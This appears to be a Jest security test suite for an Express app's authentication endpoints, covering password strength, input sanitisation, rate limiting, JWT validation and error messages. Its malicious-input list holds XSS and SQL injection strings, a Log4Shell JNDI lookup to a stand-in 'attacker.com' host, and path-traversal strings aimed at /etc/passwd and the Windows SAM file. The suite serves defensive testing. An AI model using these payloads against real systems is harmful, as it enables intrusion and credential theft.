/**
 * Authentication Routes Security Test Suite
 * Comprehensive security testing for authentication endpoints
 */

import { describe, it, expect, beforeEach, afterEach, beforeAll, afterAll } from '@jest/globals';
import supertest from 'supertest';
import express from 'express';
import { PrismaClient } from '@teaching-engine/database';
import { authRoutes } from '../../routes/auth';
import { rateLimiters, resetRateLimiterState } from '../../middleware/rateLimit';
import { sanitizeInput } from '../../middleware/inputSanitization';
import logger from '../../logger';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';

// Mock logger to avoid console output during tests
jest.mock('../../logger', () => ({
  info: jest.fn(),
  warn: jest.fn(),
  error: jest.fn(),
  debug: jest.fn(),
}));

describe('Authentication Routes Security Tests', () => {
  let app: express.Application;
  let prisma: PrismaClient;
  let request: supertest.SuperTest<supertest.Test>;

  // Test data
  const validTestUser = {
    email: 'security.test@example.com',
    name: 'Security Test User',
    password: 'SecureTest123!',
  };

  const weakPasswords = [
    '123456',
    'password',
    'qwerty',
    'abc123',
    '12345678',
    'password123',
    'admin',
    'test',
  ];

  const maliciousInputs = [
    '<script>alert("xss")</script>',
    "'; DROP TABLE users; --",
    '${jndi:ldap://attacker.com/evil}',
    '<img src=x onerror=alert(1)>',
    '{{7*7}}',
    '#{7*7}',
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
  ];

  beforeAll(async () => {
    // Set test environment variables
    process.env.JWT_SECRET = 'test-jwt-secret-for-security-testing-only';
    process.env.NODE_ENV = 'test';

    // Initialize test database
    prisma = new PrismaClient({
      datasources: {
        db: { url: process.env.DATABASE_URL || 'file:./test-security.db' },
      },
    });

    // Setup Express app with security middleware
    app = express();
    app.use(express.json());
    app.use(express.urlencoded({ extended: true }));
    app.use(sanitizeInput);
    app.use('/api/auth', rateLimiters.auth);
    app.use('/api/auth', authRoutes(prisma));

    request = supertest(app);
  });

  beforeEach(async () => {
    // Clean up test data
    await prisma.user.deleteMany({
      where: {
        email: {
          contains: 'security.test',
        },
      },
    });

    // Reset rate limiter state
    resetRateLimiterState();
  });

  afterEach(async () => {
    // Clean up any created test data
    await prisma.user.deleteMany({
      where: {
        email: {
          contains: 'security.test',
        },
      },
    });

    jest.clearAllMocks();
  });

  afterAll(async () => {
    await prisma.$disconnect();
  });

  describe('Registration Security', () => {
    it('should reject registration with weak passwords', async () => {
      for (const weakPassword of weakPasswords) {
        const response = await request.post('/api/auth/register').send({
          email: `weak.password.${Date.now()}@test.com`,
          name: 'Test User',
          password: weakPassword,
        });

        expect(response.status).toBe(400);
        expect(response.body.error).toBe('Password does not meet security requirements');
      }
    });

    it('should sanitize malicious input in registration', async () => {
      for (const maliciousInput of maliciousInputs) {
        const response = await request.post('/api/auth/register').send({
          email: `malicious.${Date.now()}@test.com`,
          name: maliciousInput,
          password: 'SecureTest123!',
        });

        // Should either sanitize the input or reject it
        if (response.status === 201) {
          // If created, check that malicious content was sanitized
          expect(response.body.user.name).not.toContain('<script>');
          expect(response.body.user.name).not.toContain('DROP TABLE');
          expect(response.body.user.name).not.toContain('alert(');
        } else {
          // Should return 400 for invalid input
          expect(response.status).toBe(400);
        }
      }
    });

    it('should prevent duplicate email registration', async () => {
      // First registration should succeed
      const firstResponse = await request.post('/api/auth/register').send(validTestUser);

      expect(firstResponse.status).toBe(201);

      // Second registration with same email should fail
      const secondResponse = await request.post('/api/auth/register').send(validTestUser);

      expect(secondResponse.status).toBe(409);
      expect(secondResponse.body.error).toBe('Email already exists');
    });

    it('should validate email format', async () => {
      const invalidEmails = [
        'invalid-email',
        '@invalid.com',
        'invalid@',
        'invalid@.com',
        'invalid..email@test.com',
        'invalid@test..com',
        '',
        null,
        undefined,
      ];

      for (const invalidEmail of invalidEmails) {
        const response = await request.post('/api/auth/register').send({
          email: invalidEmail,
          name: 'Test User',
          password: 'SecureTest123!',
        });

        expect(response.status).toBe(400);
      }
    });

    it('should hash passwords securely', async () => {
      const response = await request.post('/api/auth/register').send(validTestUser);

      expect(response.status).toBe(201);

      // Check that password was hashed in database
      const user = await prisma.user.findUnique({
        where: { email: validTestUser.email },
      });

      expect(user).toBeTruthy();
      expect(user!.password).not.toBe(validTestUser.password);
      expect(user!.password.length).toBeGreaterThan(50); // bcrypt hash length
      expect(user!.password.startsWith('$2')).toBe(true); // bcrypt format
    });

    it('should not expose password in response', async () => {
      const response = await request.post('/api/auth/register').send(validTestUser);

      expect(response.status).toBe(201);
      expect(response.body.user.password).toBeUndefined();
      expect(response.body.password).toBeUndefined();
    });

    it('should generate secure JWT tokens', async () => {
      const response = await request.post('/api/auth/register').send(validTestUser);

      expect(response.status).toBe(201);
      expect(response.body.accessToken).toBeTruthy();

      // Verify token structure
      const token = response.body.accessToken;
      const parts = token.split('.');
      expect(parts.length).toBe(3); // JWT has 3 parts

      // Verify token can be decoded
      const decoded = jwt.verify(token, process.env.JWT_SECRET!) as any;
      expect(decoded.email).toBe(validTestUser.email);
      expect(decoded.userId).toBeTruthy();
      expect(decoded.exp).toBeTruthy(); // Expiration should be set
    });
  });

  describe('Login Security', () => {
    beforeEach(async () => {
      // Create test user for login tests
      await request.post('/api/auth/register').send(validTestUser);
    });

    it('should reject login with invalid credentials', async () => {
      const response = await request.post('/api/auth/login').send({
        email: validTestUser.email,
        password: 'WrongPassword123!',
      });

      expect(response.status).toBe(401);
      expect(response.body.error).toBe('Invalid credentials');
    });

    it('should reject login with non-existent email', async () => {
      const response = await request.post('/api/auth/login').send({
        email: 'nonexistent@test.com',
        password: 'SomePassword123!',
      });

      expect(response.status).toBe(401);
      expect(response.body.error).toBe('Invalid credentials');
    });

    it('should sanitize malicious input in login', async () => {
      for (const maliciousInput of maliciousInputs) {
        const response = await request.post('/api/auth/login').send({
          email: maliciousInput,
          password: 'SomePassword123!',
        });

        // Should handle malicious input gracefully
        expect(response.status).toBe(401);
        expect(response.body.error).toBe('Invalid credentials');
      }
    });

    it('should provide secure JWT tokens on successful login', async () => {
      const response = await request.post('/api/auth/login').send({
        email: validTestUser.email,
        password: validTestUser.password,
      });

      expect(response.status).toBe(200);

      // Check that JWT token is provided in response body
      expect(response.body.accessToken).toBeTruthy();
      
      // Verify it's a valid JWT structure
      const token = response.body.accessToken;
      const parts = token.split('.');
      expect(parts.length).toBe(3); // JWT has 3 parts
    });

    it('should not expose password in login response', async () => {
      const response = await request.post('/api/auth/login').send({
        email: validTestUser.email,
        password: validTestUser.password,
      });

      expect(response.status).toBe(200);
      expect(response.body.user.password).toBeUndefined();
      expect(response.body.password).toBeUndefined();
    });

    it('should log failed login attempts', async () => {
      await request.post('/api/auth/login').send({
        email: validTestUser.email,
        password: 'WrongPassword123!',
      });

      expect(logger.warn).toHaveBeenCalledWith(
        expect.stringContaining(validTestUser.email),
        expect.any(Object),
      );
    });
  });

  describe('Rate Limiting Security', () => {
    beforeEach(async () => {
      // Create test user for rate limiting tests
      await request.post('/api/auth/register').send(validTestUser);
      resetRateLimiterState();
    });

    it('should apply rate limiting to registration attempts', async () => {
      const maxAttempts = 5; // Based on auth rate limiter config
      const promises = [];

      // Make multiple registration attempts with different emails
      for (let i = 0; i < maxAttempts + 2; i++) {
        promises.push(
          request.post('/api/auth/register').send({
            email: `rate.limit.test.${i}@test.com`,
            name: 'Rate Limit Test',
            password: 'SecureTest123!',
          }),
        );
      }

      const responses = await Promise.all(promises);

      // First attempts should succeed or fail due to business logic
      for (let i = 0; i < maxAttempts; i++) {
        expect(responses[i].status).not.toBe(429);
      }

      // Additional attempts should be rate limited
      for (let i = maxAttempts; i < responses.length; i++) {
        expect(responses[i].status).toBe(429);
        expect(responses[i].body.error).toContain('Too many');
      }
    });

    it('should apply rate limiting to failed login attempts', async () => {
      const maxAttempts = 5; // Based on auth rate limiter config
      const promises = [];

      // Make multiple failed login attempts
      for (let i = 0; i < maxAttempts + 2; i++) {
        promises.push(
          request.post('/api/auth/login').send({
            email: validTestUser.email,
            password: 'WrongPassword123!',
          }),
        );
      }

      const responses = await Promise.all(promises);

      // Later attempts should be rate limited
      const rateLimitedResponses = responses.filter((r) => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should include rate limit headers', async () => {
      const response = await request.post('/api/auth/login').send({
        email: 'nonexistent@test.com',
        password: 'WrongPassword123!',
      });

      expect(response.headers['x-ratelimit-limit']).toBeTruthy();
      expect(response.headers['x-ratelimit-remaining']).toBeTruthy();
      expect(response.headers['x-ratelimit-reset']).toBeTruthy();
    });
  });

  describe('JWT Token Security', () => {
    let validToken: string;
    let userId: string;

    beforeEach(async () => {
      // Create user and get token
      const response = await request.post('/api/auth/register').send(validTestUser);

      validToken = response.body.accessToken;
      userId = response.body.user.id;
    });

    it('should generate tokens with expiration', async () => {
      const decoded = jwt.verify(validToken, process.env.JWT_SECRET!) as any;
      expect(decoded.exp).toBeTruthy();
      expect(decoded.exp > Math.floor(Date.now() / 1000)).toBe(true);
    });

    it('should reject tampered tokens', async () => {
      const tamperedToken = validToken.slice(0, -5) + 'XXXXX';

      const app2 = express();
      app2.use(express.json());
      const { authMiddleware } = await import('../../middleware/auth');
      app2.use('/protected', authMiddleware, (req, res) => {
        res.json({ success: true });
      });

      const response = await supertest(app2)
        .get('/protected')
        .set('Authorization', `Bearer ${tamperedToken}`);

      expect(response.status).toBe(401);
    });

    it('should reject expired tokens', async () => {
      // Create a token that expires immediately
      const expiredToken = jwt.sign(
        { userId, email: validTestUser.email },
        process.env.JWT_SECRET!,
        { expiresIn: '1ms' },
      );

      // Wait for token to expire
      await new Promise((resolve) => setTimeout(resolve, 10));

      const app2 = express();
      app2.use(express.json());
      const { authMiddleware } = await import('../../middleware/auth');
      app2.use('/protected', authMiddleware, (req, res) => {
        res.json({ success: true });
      });

      const response = await supertest(app2)
        .get('/protected')
        .set('Authorization', `Bearer ${expiredToken}`);

      expect(response.status).toBe(401);
    });

    it('should require authorization header format', async () => {
      const app2 = express();
      app2.use(express.json());
      const { authMiddleware } = await import('../../middleware/auth');
      app2.use('/protected', authMiddleware, (req, res) => {
        res.json({ success: true });
      });

      // Test various invalid formats
      const invalidFormats = [
        validToken, // Missing "Bearer "
        `Token ${validToken}`, // Wrong prefix
        `Bearer`, // Missing token
        `Bearer  ${validToken}`, // Double space
        '', // Empty
      ];

      for (const invalidFormat of invalidFormats) {
        const response = await supertest(app2)
          .get('/protected')
          .set('Authorization', invalidFormat);

        expect(response.status).toBe(401);
      }
    });
  });

  describe('Input Validation Security', () => {
    it('should reject oversized inputs', async () => {
      const oversizedString = 'A'.repeat(20000); // Very large string

      const response = await request.post('/api/auth/register').send({
        email: 'oversized@test.com',
        name: oversizedString,
        password: 'SecureTest123!',
      });

      // Should handle oversized input gracefully
      expect(response.status).toBeOneOf([400, 413]); // Bad request or payload too large
    });

    it('should reject null bytes and control characters', async () => {
      const maliciousStrings = [
        'test\x00user', // Null byte
        'test\x01user', // Control character
        'test\x1Fuser', // Control character
        'test\x7Fuser', // DEL character
      ];

      for (const maliciousString of maliciousStrings) {
        const response = await request.post('/api/auth/register').send({
          email: 'control.char.test@example.com',
          name: maliciousString,
          password: 'SecureTest123!',
        });

        // Should sanitize or reject
        if (response.status === 201) {
          expect(response.body.user.name).not.toContain('\x00');
          expect(response.body.user.name).not.toContain('\x01');
        } else {
          expect(response.status).toBe(400);
        }
      }
    });

    it('should handle missing required fields', async () => {
      const testCases = [
        { email: 'test@example.com', name: 'Test' }, // Missing password
        { email: 'test@example.com', password: 'SecureTest123!' }, // Missing name
        { name: 'Test', password: 'SecureTest123!' }, // Missing email
        {}, // Missing all fields
      ];

      for (const testCase of testCases) {
        const response = await request.post('/api/auth/register').send(testCase);

        expect(response.status).toBe(400);
      }
    });

    it('should handle invalid data types', async () => {
      const testCases = [
        { email: 123, name: 'Test', password: 'SecureTest123!' },
        { email: 'test@example.com', name: {}, password: 'SecureTest123!' },
        { email: 'test@example.com', name: 'Test', password: [] },
        { email: null, name: 'Test', password: 'SecureTest123!' },
      ];

      for (const testCase of testCases) {
        const response = await request.post('/api/auth/register').send(testCase);

        expect(response.status).toBe(400);
      }
    });
  });

  describe('Error Handling Security', () => {
    it('should not expose sensitive information in error messages', async () => {
      // Test with database connection error scenario
      const response = await request.post('/api/auth/login').send({
        email: 'test@example.com',
        password: 'password',
      });

      // Error messages should be generic
      expect(response.body.error).toBe('Invalid credentials');
      expect(response.body.error).not.toContain('database');
      expect(response.body.error).not.toContain('connection');
      expect(response.body.error).not.toContain('Prisma');
      expect(response.body.error).not.toContain('SQL');
    });

    it('should not expose stack traces in production mode', async () => {
      const originalEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'production';

      try {
        const response = await request.post('/api/auth/login').send({
          email: 'invalid-email-format',
          password: 'password',
        });

        expect(response.body.stack).toBeUndefined();
        expect(response.body.trace).toBeUndefined();
      } finally {
        process.env.NODE_ENV = originalEnv;
      }
    });
  });
});
